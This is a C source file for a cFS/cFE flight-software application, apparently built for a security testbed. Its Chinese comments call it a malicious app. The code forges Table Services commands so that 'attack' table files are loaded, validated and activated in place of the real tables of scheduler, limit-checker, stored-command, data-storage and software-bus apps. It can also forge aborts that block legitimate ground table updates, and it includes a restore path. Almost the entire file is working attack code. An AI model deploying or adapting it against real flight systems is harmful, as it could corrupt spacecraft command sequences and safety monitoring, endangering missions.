#include "sp004_table_tamper_app.h"

#include "cfe_tbl_extern_typedefs.h"
#include "cfe_tbl_fcncodes.h"
#include "cfe_tbl_msg.h"
#include "cfe_tbl_msgids.h"

#include <stdbool.h>
#include <string.h>

typedef struct
{
    uint16      TargetId;
    const char *TableName;  // cFE中真实注册表名
    const char *AttackFilename; // 恶意表文件路径
    const char *RestoreFilename; // 恢复用原始表路径
    const char *DumpFilename; // 导出 active/inactive时使用的文件名
} SP004_TargetSpec_t;

static const SP004_TargetSpec_t SP004_Targets[] = {
    {SP004_TARGET_DS_FILE, "DS.FILE_TBL", "/cf/sp004_ds_file.tbl", "/cf/ds_file_tbl.tbl",
     "/cf/sp004_ds_file_dump.tbl"},
    {SP004_TARGET_DS_FILTER, "DS.FILTER_TBL", "/cf/sp004_ds_filter.tbl", "/cf/ds_filter_tbl.tbl",
     "/cf/sp004_ds_filter_dump.tbl"},
    {SP004_TARGET_SCH_SCHED, "SCH.SCHED_DEF", "/cf/sp004_sch_sched.tbl", "/cf/sch_def_schtbl.tbl",
     "/cf/sp004_sch_sched_dump.tbl"},
    {SP004_TARGET_SCH_MSG, "SCH.MSG_DEFS", "/cf/sp004_sch_msg.tbl", "/cf/sch_def_msgtbl.tbl",
     "/cf/sp004_sch_msg_dump.tbl"},
    {SP004_TARGET_LC_WDT, "LC.LC_WDT", "/cf/sp004_lc_wdt.tbl", "/cf/lc_def_wdt.tbl",
     "/cf/sp004_lc_wdt_dump.tbl"},
    {SP004_TARGET_LC_ADT, "LC.LC_ADT", "/cf/sp004_lc_adt.tbl", "/cf/lc_def_adt.tbl",
     "/cf/sp004_lc_adt_dump.tbl"},
    {SP004_TARGET_FM_MONITOR, "FM.FreeSpace", "/cf/sp004_fm_bad.tbl", "/cf/fm_monitor.tbl",
     "/cf/sp004_fm_monitor_dump.tbl"},
    {SP004_TARGET_CF_CONFIG, "CF.config_table", "/cf/sp004_cf_cfg.tbl", "/cf/cf_def_config.tbl",
     "/cf/sp004_cf_config_dump.tbl"},
    {SP004_TARGET_TO_CONFIG, "TO.to_config", "/cf/sp004_to_cfg.tbl", "/cf/to_config.tbl",
     "/cf/sp004_to_config_dump.tbl"},
    {SP004_TARGET_SC_RTS001, "SC.RTS_TBL001", "/cf/sp004_sc_rts1.tbl", "/cf/sc_rts001.tbl",
     "/cf/sp004_sc_rts001_dump.tbl"},
    {SP004_TARGET_SC_ATS1, "SC.ATS_TBL1", "/cf/sp004_sc_ats1.tbl", "/cf/sc_ats1.tbl",
     "/cf/sp004_sc_ats1_dump.tbl"},
    {SP004_TARGET_SBN_CONF, "SBN.SBN_ConfTbl", "/cf/sp004_sbn_cfg.tbl", "/cf/sbn_conf_tbl.tbl",
     "/cf/sp004_sbn_conf_dump.tbl"},
};

static const SP004_TargetSpec_t *SP004_FindTarget(uint16 TargetId);
static void                      SP004_CopyString(char *Dest, size_t DestSize, const char *Src);
static const char               *SP004_FirstNonEmpty(const char *Primary, const char *Fallback);
static void                      SP004_RecordInputs(uint16 ActionMask, const char *TableName, const char *LoadFilename,
                                                    const char *DumpFilename);
static int32                     SP004_Transmit(CFE_MSG_Message_t *Msg);
static int32                     SP004_SendTblLoad(const char *LoadFilename);
static int32                     SP004_SendTblValidate(const char *TableName, uint16 ActiveTableFlag);
static int32                     SP004_SendTblActivate(const char *TableName);
static int32                     SP004_SendTblDump(const char *TableName, uint16 ActiveTableFlag, const char *DumpFilename);
static int32                     SP004_SendTblSendRegistry(const char *TableName);
static int32                     SP004_SendTblDumpRegistry(const char *DumpFilename);
static int32                     SP004_SendTblAbortLoad(const char *TableName);
static int32                     SP004_Delay(int32 DelayMs);
static int32                     SP004_RunLoadValidateActivate(const SP004_RunProfileCmd_t *Cmd, bool UseRestoreFile,
                                                               bool DumpAfterActivate);

int32 SP004_RunProfile(const SP004_RunProfileCmd_t *Cmd)
{
    const SP004_TargetSpec_t *Target;
    const char               *TableName;
    const char               *LoadFilename;
    const char               *RestoreFilename;
    const char               *DumpFilename;
    uint16                    ActionMask;
    int32                     Status = CFE_SUCCESS;

    Target = SP004_FindTarget(Cmd->TargetId);
    if (Target == NULL && Cmd->TargetId != SP004_TARGET_CUSTOM)
    {
        CFE_EVS_SendEvent(SP004_TBL_ERR_EID, CFE_EVS_EventType_ERROR,
                          "SP004: unknown table target id %u", (unsigned int)Cmd->TargetId);
        return CFE_STATUS_BAD_COMMAND_CODE;
    }

    TableName       = SP004_FirstNonEmpty(Cmd->TableName, (Target != NULL) ? Target->TableName : "");
    LoadFilename    = SP004_FirstNonEmpty(Cmd->LoadFilename, (Target != NULL) ? Target->AttackFilename : "");
    RestoreFilename = SP004_FirstNonEmpty(Cmd->RestoreFilename, (Target != NULL) ? Target->RestoreFilename : "");
    DumpFilename    = SP004_FirstNonEmpty(Cmd->DumpFilename, (Target != NULL) ? Target->DumpFilename : "/cf/sp004_tbl_dump.tbl");

    switch (Cmd->ProfileId)
    {
        case SP004_PROFILE_TBL_LOAD:
            ActionMask = SP004_ACTION_LOAD;
            if ((Cmd->Flags & SP004_FLAG_USE_RESTORE_FILE) != 0)
            {
                LoadFilename = RestoreFilename;
                ActionMask |= SP004_ACTION_RESTORE;
            }

            SP004_RecordInputs(ActionMask, TableName, LoadFilename, DumpFilename);
            Status = SP004_SendTblLoad(LoadFilename);
            break;

        case SP004_PROFILE_TBL_VALIDATE_INACTIVE:
            SP004_RecordInputs(SP004_ACTION_VALIDATE, TableName, LoadFilename, DumpFilename);
            Status = SP004_SendTblValidate(TableName, CFE_TBL_BufferSelect_INACTIVE);
            break;

        case SP004_PROFILE_TBL_VALIDATE_ACTIVE:
            SP004_RecordInputs(SP004_ACTION_VALIDATE, TableName, LoadFilename, DumpFilename);
            Status = SP004_SendTblValidate(TableName, CFE_TBL_BufferSelect_ACTIVE);
            break;

        case SP004_PROFILE_TBL_ACTIVATE:
            SP004_RecordInputs(SP004_ACTION_ACTIVATE, TableName, LoadFilename, DumpFilename);
            Status = SP004_SendTblActivate(TableName);
            break;

        case SP004_PROFILE_TBL_DUMP_INACTIVE:
            SP004_RecordInputs(SP004_ACTION_DUMP, TableName, LoadFilename, DumpFilename);
            Status = SP004_SendTblDump(TableName, CFE_TBL_BufferSelect_INACTIVE, DumpFilename);
            break;

        case SP004_PROFILE_TBL_DUMP_ACTIVE:
            SP004_RecordInputs(SP004_ACTION_DUMP, TableName, LoadFilename, DumpFilename);
            Status = SP004_SendTblDump(TableName, CFE_TBL_BufferSelect_ACTIVE, DumpFilename);
            break;

        case SP004_PROFILE_TBL_SEND_REGISTRY:
            SP004_RecordInputs(SP004_ACTION_REGISTRY, TableName, LoadFilename, DumpFilename);
            Status = SP004_SendTblSendRegistry(TableName);
            break;

        case SP004_PROFILE_TBL_DUMP_REGISTRY:
            SP004_RecordInputs(SP004_ACTION_REGISTRY, TableName, LoadFilename, DumpFilename);
            Status = SP004_SendTblDumpRegistry(DumpFilename);
            break;

        case SP004_PROFILE_TBL_ABORT_LOAD:
            SP004_RecordInputs(SP004_ACTION_ABORT, TableName, LoadFilename, DumpFilename);
            Status = SP004_SendTblAbortLoad(TableName);
            break;

        case SP004_PROFILE_LOAD_VALIDATE_ACTIVATE:
            Status = SP004_RunLoadValidateActivate(Cmd, false, false);
            break;

        case SP004_PROFILE_LOAD_VALIDATE_ACTIVATE_DUMP:
            Status = SP004_RunLoadValidateActivate(Cmd, false, true);
            break;

        case SP004_PROFILE_RESTORE_VALIDATE_ACTIVATE:
            Status = SP004_RunLoadValidateActivate(Cmd, true, false);
            break;

        case SP004_PROFILE_RESTORE_VALIDATE_ACTIVATE_DUMP:
            Status = SP004_RunLoadValidateActivate(Cmd, true, true);
            break;

        default:
            CFE_EVS_SendEvent(SP004_TBL_ERR_EID, CFE_EVS_EventType_ERROR,
                              "SP004: invalid profile id %u", (unsigned int)Cmd->ProfileId);
            return CFE_STATUS_BAD_COMMAND_CODE;
    }

    return Status;
}

static const SP004_TargetSpec_t *SP004_FindTarget(uint16 TargetId)
{
    size_t i;

    for (i = 0; i < (sizeof(SP004_Targets) / sizeof(SP004_Targets[0])); i++)
    {
        if (SP004_Targets[i].TargetId == TargetId)
        {
            return &SP004_Targets[i];
        }
    }

    return NULL;
}

static void SP004_CopyString(char *Dest, size_t DestSize, const char *Src)
{
    if (DestSize == 0)
    {
        return;
    }

    if (Src == NULL)
    {
        Src = "";
    }

    strncpy(Dest, Src, DestSize - 1);
    Dest[DestSize - 1] = '\0';
}

// 选择“用户显式传入值”还是“目标默认值”，比如 Ruby 脚本没有传 TableName，只传了 TargetId=FM_MONITOR，那么这里会自动使用 FM.FreeSpace。
// 如果用户传了 custom table name，就优先用用户传的。
static const char *SP004_FirstNonEmpty(const char *Primary, const char *Fallback)
{
    if (Primary != NULL && Primary[0] != '\0')
    {
        return Primary;
    }

    if (Fallback != NULL)
    {
        return Fallback;
    }

    return "";
}

static void SP004_RecordInputs(uint16 ActionMask, const char *TableName, const char *LoadFilename,
                               const char *DumpFilename)
{
    SP004_AppData.HkTelemetryPkt.LastActionMask = ActionMask;
    SP004_CopyString(SP004_AppData.HkTelemetryPkt.LastTableName,
                     sizeof(SP004_AppData.HkTelemetryPkt.LastTableName), TableName);
    SP004_CopyString(SP004_AppData.HkTelemetryPkt.LastLoadFilename,
                     sizeof(SP004_AppData.HkTelemetryPkt.LastLoadFilename), LoadFilename);
    SP004_CopyString(SP004_AppData.HkTelemetryPkt.LastDumpFilename,
                     sizeof(SP004_AppData.HkTelemetryPkt.LastDumpFilename), DumpFilename);
}

static int32 SP004_Transmit(CFE_MSG_Message_t *Msg)
{
    int32 Status;

    CFE_SB_TimeStampMsg(Msg);
    Status = CFE_SB_TransmitMsg(Msg, true);
    SP004_AppData.HkTelemetryPkt.LastTblStatus = Status;

    if (Status != CFE_SUCCESS)
    {
        SP004_AppData.HkTelemetryPkt.TxErrorCount++;
    }

    return Status;
}

// 构造一个 CFE_TBL_LOAD_CC 命令，让table服务从某个文件路径加载.tal文件
static int32 SP004_SendTblLoad(const char *LoadFilename)
{
    CFE_TBL_LoadCmd_t Cmd;

    memset(&Cmd, 0, sizeof(Cmd));
    CFE_MSG_Init(CFE_MSG_PTR(Cmd.CommandHeader), CFE_SB_ValueToMsgId(CFE_TBL_CMD_MID), sizeof(Cmd));
    CFE_MSG_SetFcnCode((CFE_MSG_Message_t *)&Cmd, CFE_TBL_LOAD_CC);
    SP004_CopyString(Cmd.Payload.LoadFilename, sizeof(Cmd.Payload.LoadFilename), LoadFilename);

    SP004_AppData.HkTelemetryPkt.TblLoadCount++;
    return SP004_Transmit((CFE_MSG_Message_t *)&Cmd);
}

// 让CFE对表做验证
static int32 SP004_SendTblValidate(const char *TableName, uint16 ActiveTableFlag)
{
    CFE_TBL_ValidateCmd_t Cmd;

    memset(&Cmd, 0, sizeof(Cmd));
    CFE_MSG_Init(CFE_MSG_PTR(Cmd.CommandHeader), CFE_SB_ValueToMsgId(CFE_TBL_CMD_MID), sizeof(Cmd));
    CFE_MSG_SetFcnCode((CFE_MSG_Message_t *)&Cmd, CFE_TBL_VALIDATE_CC);
    Cmd.Payload.ActiveTableFlag = ActiveTableFlag;
    SP004_CopyString(Cmd.Payload.TableName, sizeof(Cmd.Payload.TableName), TableName);

    SP004_AppData.HkTelemetryPkt.TblValidateCount++;
    return SP004_Transmit((CFE_MSG_Message_t *)&Cmd);
}

// 激活表
static int32 SP004_SendTblActivate(const char *TableName)
{
    CFE_TBL_ActivateCmd_t Cmd;

    memset(&Cmd, 0, sizeof(Cmd));
    CFE_MSG_Init(CFE_MSG_PTR(Cmd.CommandHeader), CFE_SB_ValueToMsgId(CFE_TBL_CMD_MID), sizeof(Cmd));
    CFE_MSG_SetFcnCode((CFE_MSG_Message_t *)&Cmd, CFE_TBL_ACTIVATE_CC);
    SP004_CopyString(Cmd.Payload.TableName, sizeof(Cmd.Payload.TableName), TableName);

    SP004_AppData.HkTelemetryPkt.TblActivateCount++;
    return SP004_Transmit((CFE_MSG_Message_t *)&Cmd);
}

// 导出表内容，用于证明激活的表(active table)已变化，用于做证据的（但不是必须证据）
static int32 SP004_SendTblDump(const char *TableName, uint16 ActiveTableFlag, const char *DumpFilename)
{
    CFE_TBL_DumpCmd_t Cmd;

    memset(&Cmd, 0, sizeof(Cmd));
    CFE_MSG_Init(CFE_MSG_PTR(Cmd.CommandHeader), CFE_SB_ValueToMsgId(CFE_TBL_CMD_MID), sizeof(Cmd));
    CFE_MSG_SetFcnCode((CFE_MSG_Message_t *)&Cmd, CFE_TBL_DUMP_CC);
    Cmd.Payload.ActiveTableFlag = ActiveTableFlag;
    SP004_CopyString(Cmd.Payload.TableName, sizeof(Cmd.Payload.TableName), TableName);
    SP004_CopyString(Cmd.Payload.DumpFilename, sizeof(Cmd.Payload.DumpFilename), DumpFilename);

    SP004_AppData.HkTelemetryPkt.TblDumpCount++;
    return SP004_Transmit((CFE_MSG_Message_t *)&Cmd);
}

// 让 Table Services 发送某张表的 registry telemetry，比如恶意 app 请求：SCH.SCHED_DEF
// 然后地面能收到：CFE_TBL_TBLREGPACKET、NAME = SCH.SCHED_DEF、SIZE = 6000
static int32 SP004_SendTblSendRegistry(const char *TableName)
{
    CFE_TBL_SendRegistryCmd_t Cmd;

    memset(&Cmd, 0, sizeof(Cmd));
    CFE_MSG_Init(CFE_MSG_PTR(Cmd.CommandHeader), CFE_SB_ValueToMsgId(CFE_TBL_CMD_MID), sizeof(Cmd));
    CFE_MSG_SetFcnCode((CFE_MSG_Message_t *)&Cmd, CFE_TBL_SEND_REGISTRY_CC);
    SP004_CopyString(Cmd.Payload.TableName, sizeof(Cmd.Payload.TableName), TableName);

    SP004_AppData.HkTelemetryPkt.TblRegistryCount++;
    return SP004_Transmit((CFE_MSG_Message_t *)&Cmd);
}

// 要求 TBL 把整个 table registry dump 到文件
static int32 SP004_SendTblDumpRegistry(const char *DumpFilename)
{
    CFE_TBL_DumpRegistryCmd_t Cmd;

    memset(&Cmd, 0, sizeof(Cmd));
    CFE_MSG_Init(CFE_MSG_PTR(Cmd.CommandHeader), CFE_SB_ValueToMsgId(CFE_TBL_CMD_MID), sizeof(Cmd));
    CFE_MSG_SetFcnCode((CFE_MSG_Message_t *)&Cmd, CFE_TBL_DUMP_REGISTRY_CC);
    SP004_CopyString(Cmd.Payload.DumpFilename, sizeof(Cmd.Payload.DumpFilename), DumpFilename);

    SP004_AppData.HkTelemetryPkt.TblRegistryCount++;
    return SP004_Transmit((CFE_MSG_Message_t *)&Cmd);
}

// 取消某张表当前 pending 的 inactive load。比如地面正在加载合法新表，恶意 app 伪造 abort，导致更新不能继续
static int32 SP004_SendTblAbortLoad(const char *TableName)
{
    CFE_TBL_AbortLoadCmd_t Cmd;

    memset(&Cmd, 0, sizeof(Cmd));
    CFE_MSG_Init(CFE_MSG_PTR(Cmd.CommandHeader), CFE_SB_ValueToMsgId(CFE_TBL_CMD_MID), sizeof(Cmd));
    CFE_MSG_SetFcnCode((CFE_MSG_Message_t *)&Cmd, CFE_TBL_ABORT_LOAD_CC);
    SP004_CopyString(Cmd.Payload.TableName, sizeof(Cmd.Payload.TableName), TableName);

    SP004_AppData.HkTelemetryPkt.TblAbortCount++;
    return SP004_Transmit((CFE_MSG_Message_t *)&Cmd);
}

static int32 SP004_Delay(int32 DelayMs)
{
    if (DelayMs > 0)
    {
        OS_TaskDelay((uint32)DelayMs);
    }

    return CFE_SUCCESS;
}

// 组合攻击链函数，把load、validatte inactive、activate、dumpc active组合起来
static int32 SP004_RunLoadValidateActivate(const SP004_RunProfileCmd_t *Cmd, bool UseRestoreFile,
                                           bool DumpAfterActivate)
{
    const SP004_TargetSpec_t *Target;
    const char               *TableName;
    const char               *LoadFilename;
    const char               *DumpFilename;
    uint16                    ActionMask;
    int32                     Status;

    Target = SP004_FindTarget(Cmd->TargetId);
    if (Target == NULL && Cmd->TargetId != SP004_TARGET_CUSTOM)
    {
        return CFE_STATUS_BAD_COMMAND_CODE;
    }

    TableName    = SP004_FirstNonEmpty(Cmd->TableName, (Target != NULL) ? Target->TableName : "");
    DumpFilename = SP004_FirstNonEmpty(Cmd->DumpFilename, (Target != NULL) ? Target->DumpFilename : "/cf/sp004_tbl_dump.tbl");

    if (UseRestoreFile)
    {
        LoadFilename = SP004_FirstNonEmpty(Cmd->RestoreFilename, (Target != NULL) ? Target->RestoreFilename : "");
        ActionMask   = SP004_ACTION_RESTORE | SP004_ACTION_LOAD | SP004_ACTION_VALIDATE | SP004_ACTION_ACTIVATE;
    }
    else
    {
        LoadFilename = SP004_FirstNonEmpty(Cmd->LoadFilename, (Target != NULL) ? Target->AttackFilename : "");
        ActionMask   = SP004_ACTION_LOAD | SP004_ACTION_VALIDATE | SP004_ACTION_ACTIVATE;
    }

    if (DumpAfterActivate)
    {
        ActionMask |= SP004_ACTION_DUMP;
    }

    SP004_RecordInputs(ActionMask, TableName, LoadFilename, DumpFilename);

    Status = SP004_SendTblLoad(LoadFilename);
    if (Status != CFE_SUCCESS)
    {
        return Status;
    }

    SP004_Delay(Cmd->StepDelayMs);

    Status = SP004_SendTblValidate(TableName, CFE_TBL_BufferSelect_INACTIVE);
    if (Status != CFE_SUCCESS)
    {
        return Status;
    }

    SP004_Delay(Cmd->StepDelayMs);

    Status = SP004_SendTblActivate(TableName);
    if (Status != CFE_SUCCESS)
    {
        return Status;
    }

    if (UseRestoreFile)
    {
        SP004_AppData.HkTelemetryPkt.RestoreCount++;
    }

    if (DumpAfterActivate)
    {
        SP004_Delay(Cmd->StepDelayMs);
        Status = SP004_SendTblDump(TableName, CFE_TBL_BufferSelect_ACTIVE, DumpFilename);
    }

    return Status;
}
